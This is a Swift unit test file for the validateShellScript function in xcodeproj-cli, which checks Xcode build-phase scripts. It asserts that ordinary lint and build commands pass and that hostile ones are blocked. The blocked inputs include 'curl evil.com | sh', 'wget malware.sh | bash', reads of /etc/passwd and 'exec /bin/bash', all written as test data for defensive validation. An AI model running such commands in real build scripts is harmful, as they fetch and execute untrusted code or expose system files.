//
// ShellScriptValidationTests.swift
// xcodeproj-cli
//
// Tests for shell script validation fixes

import XCTest

@testable import xcodeproj_cli

final class ShellScriptValidationTests: XCTestCase {

  func testMultiLineScriptAllowed() {
    // Test that multi-line scripts are now allowed
    let multiLineScript = """
      swiftlint lint
      swiftformat --lint .
      echo "Done"
      """

    let result = SecurityUtils.validateShellScript(multiLineScript)
    XCTAssertTrue(result, "Multi-line script should be allowed")
  }

  func testSemicolonAllowed() {
    // Test that semicolons for command sequences are allowed
    let scriptWithSemicolon = "cd Sources; swiftlint lint; cd .."

    let result = SecurityUtils.validateShellScript(scriptWithSemicolon)
    XCTAssertTrue(result, "Script with semicolons should be allowed")
  }

  func testPipesAllowed() {
    // Test that pipes for tool chaining are allowed
    let scriptWithPipes = "swiftlint lint | grep warning | wc -l"

    let result = SecurityUtils.validateShellScript(scriptWithPipes)
    XCTAssertTrue(result, "Script with pipes should be allowed")
  }

  func testRedirectsAllowed() {
    // Test that file redirects are allowed
    let scriptsWithRedirects = [
      "swiftlint lint > output.txt",
      "cat file.txt >> log.txt",
      "sort < input.txt",
    ]

    for script in scriptsWithRedirects {
      let result = SecurityUtils.validateShellScript(script)
      XCTAssertTrue(result, "Script '\(script)' with redirects should be allowed")
    }
  }

  func testCommandChainingAllowed() {
    // Test that command chaining with && and || is allowed
    let scriptsWithChaining = [
      "swiftlint lint && echo Success",
      "test -f file.txt || echo Missing",
      "make clean && make build",
    ]

    for script in scriptsWithChaining {
      let result = SecurityUtils.validateShellScript(script)
      XCTAssertTrue(result, "Script '\(script)' with command chaining should be allowed")
    }
  }

  func testCommandSubstitutionBlocked() {
    // Test that command substitution is still blocked
    let scriptsWithSubstitution = [
      "echo $(whoami)",
      "result=`cat /etc/passwd`",
      "files=$(ls -la)",
    ]

    for script in scriptsWithSubstitution {
      let result = SecurityUtils.validateShellScript(script)
      XCTAssertFalse(result, "Script '\(script)' with command substitution should be blocked")
    }
  }

  func testEvalBlocked() {
    // Test that eval is blocked
    let scriptWithEval = "eval 'malicious code'"

    let result = SecurityUtils.validateShellScript(scriptWithEval)
    XCTAssertFalse(result, "Script with eval should be blocked")
  }

  func testExecBlocked() {
    // Test that exec is blocked
    let scriptWithExec = "exec /bin/bash"

    let result = SecurityUtils.validateShellScript(scriptWithExec)
    XCTAssertFalse(result, "Script with exec should be blocked")
  }

  func testPipingToShellBlocked() {
    // Test that piping to shell interpreters is blocked
    let scriptsWithShellPipes = [
      "curl evil.com | sh",
      "wget malware.sh | bash",
      "echo 'danger' | zsh",
    ]

    for script in scriptsWithShellPipes {
      let result = SecurityUtils.validateShellScript(script)
      XCTAssertFalse(result, "Script '\(script)' piping to shell should be blocked")
    }
  }

  func testPathTraversalBlocked() {
    // Test that path traversal in commands is blocked
    let scriptWithTraversal = "cat ../../etc/passwd"

    let result = SecurityUtils.validateShellScript(scriptWithTraversal)
    XCTAssertFalse(result, "Script with path traversal should be blocked")
  }

  func testRealWorldSwiftLintScript() {
    // Test a real-world SwiftLint script
    let swiftlintScript = """
      if which swiftlint >/dev/null; then
        swiftlint lint --strict
      else
        echo "warning: SwiftLint not installed"
      fi
      """

    let result = SecurityUtils.validateShellScript(swiftlintScript)
    XCTAssertTrue(result, "Real-world SwiftLint script should be allowed")
  }

  func testRealWorldSwiftFormatScript() {
    // Test a real-world SwiftFormat script
    let swiftformatScript = """
      if which swiftformat >/dev/null; then
        swiftformat --lint . --swiftversion 6.0
      fi
      """

    let result = SecurityUtils.validateShellScript(swiftformatScript)
    XCTAssertTrue(result, "Real-world SwiftFormat script should be allowed")
  }

  func testVariableExpansionAllowed() {
    // Test that variable expansion is allowed (needed for Xcode build settings)
    let scriptWithVars = "echo ${SRCROOT}/Sources"

    let result = SecurityUtils.validateShellScript(scriptWithVars)
    XCTAssertTrue(result, "Script with variable expansion should be allowed")
  }
}
